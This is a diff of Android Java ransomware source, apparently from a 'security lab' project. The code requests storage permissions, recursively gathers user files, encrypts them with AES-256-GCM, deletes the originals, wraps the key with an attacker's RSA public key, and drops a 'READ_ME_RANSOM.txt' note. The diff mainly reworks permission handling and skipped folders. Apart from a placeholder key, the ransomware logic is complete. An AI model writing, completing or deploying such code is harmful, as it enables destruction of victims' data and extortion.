@@ -1,12 +1,11 @@
 package com.security.lab;
 
+import android.Manifest;
 import android.app.Activity;
-import android.content.Intent;
-import android.net.Uri;
+import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
-import android.provider.Settings;
 import android.widget.TextView;
 
 import java.io.File;
@@ -27,10 +26,11 @@ import javax.crypto.spec.GCMParameterSpec;
 
 public class MainActivity extends Activity {
 
-    // Public RSA key (replace with real PEM for actual use)
+    // Replace with real RSA-2048 public key (DER base64) for actual use
     private static final String RSA_PUB_PEM =
         "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr...REPLACE...IDAQAB";
 
+    private static final int REQ_PERM = 1001;
     private TextView log;
 
     @Override
@@ -40,20 +40,33 @@ public class MainActivity extends Activity {
         log.setPadding(32, 48, 32, 32);
         setContentView(log);
 
-        requestAllFilesAccess();
+        if (!hasStoragePerms()) {
+            requestPermissions(new String[]{
+                Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE
+            }, REQ_PERM);
+        } else {
+            runEncryption();
+        }
     }
 
-    // Request MANAGE_EXTERNAL_STORAGE on Android 11+
-    private void requestAllFilesAccess() {
-        if (Build.VERSION.SDK_INT >= 30 &&
-            !Environment.isExternalStorageManager()) {
-            Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
-            i.setData(Uri.parse("package:" + getPackageName()));
-            startActivity(i);
-            log.setText("Grant all-files access, then reopen app.");
-            return;
+    private boolean hasStoragePerms() {
+        if (Build.VERSION.SDK_INT < 23) return true;
+        return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
+                    == PackageManager.PERMISSION_GRANTED
+            && checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)
+                    == PackageManager.PERMISSION_GRANTED;
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int code, String[] p, int[] res) {
+        super.onRequestPermissionsResult(code, p, res);
+        if (code == REQ_PERM && res.length > 0
+                && res[0] == PackageManager.PERMISSION_GRANTED) {
+            runEncryption();
+        } else {
+            log.setText("Permission denied");
         }
-        runEncryption();
     }
 
     private void runEncryption() {
@@ -68,13 +81,9 @@ public class MainActivity extends Activity {
 
                 int done = 0;
                 for (File f : targets) {
-                    try {
-                        encryptFile(f, aes);
-                        done++;
-                    } catch (Exception ignored) {}
+                    try { encryptFile(f, aes); done++; } catch (Exception ignored) {}
                 }
 
-                // Ransom note + encrypted AES key
                 File note = new File(root, "READ_ME_RANSOM.txt");
                 writeNote(note, rsaWrapped);
 
@@ -87,13 +96,13 @@ public class MainActivity extends Activity {
         }).start();
     }
 
-    // Recursive file collection by extension
     private void collect(File dir, List<File> out) {
         File[] list = dir.listFiles();
         if (list == null) return;
         for (File f : list) {
             if (f.isDirectory()) {
-                if (f.getName().equals("Android")) continue; // skip system dir
+                String n = f.getName();
+                if (n.equals("Android") || n.equals("data") || n.equals("obb")) continue;
                 collect(f, out);
             } else if (isTarget(f.getName())) {
                 out.add(f);
@@ -109,12 +118,11 @@ public class MainActivity extends Activity {
         return false;
     }
 
-    // AES-256-GCM: iv(12) + tag(16) + ciphertext, tag added automatically
     private void encryptFile(File in, SecretKey key) throws Exception {
         if (in.getName().endsWith(".enc")) return;
         FileInputStream fis = new FileInputStream(in);
         byte[] plain = new byte[(int) in.length()];
-        int r = fis.read(plain);
+        fis.read(plain);
         fis.close();
 
         byte[] iv = new byte[12];
@@ -132,14 +140,12 @@ public class MainActivity extends Activity {
         in.delete();
     }
 
-    // AES-256 key generation
     private static SecretKey genAesKey() throws Exception {
         KeyGenerator kg = KeyGenerator.getInstance("AES");
         kg.init(256);
         return kg.generateKey();
     }
 
-    // RSA-OAEP wrap of AES key with public key
     private byte[] rsaWrap(byte[] aesKey) throws Exception {
         byte[] der = Base64.getDecoder().decode(RSA_PUB_PEM);
         PublicKey pub = KeyFactory.getInstance("RSA")
@@ -149,7 +155,6 @@ public class MainActivity extends Activity {
         return rsa.doFinal(aesKey);
     }
 
-    // Note + wrapped key in base64
     private void writeNote(File note, byte[] wrapped) throws Exception {
         StringBuilder sb = new StringBuilder();
         sb.append("YOUR FILES ARE ENCRYPTED.\n");
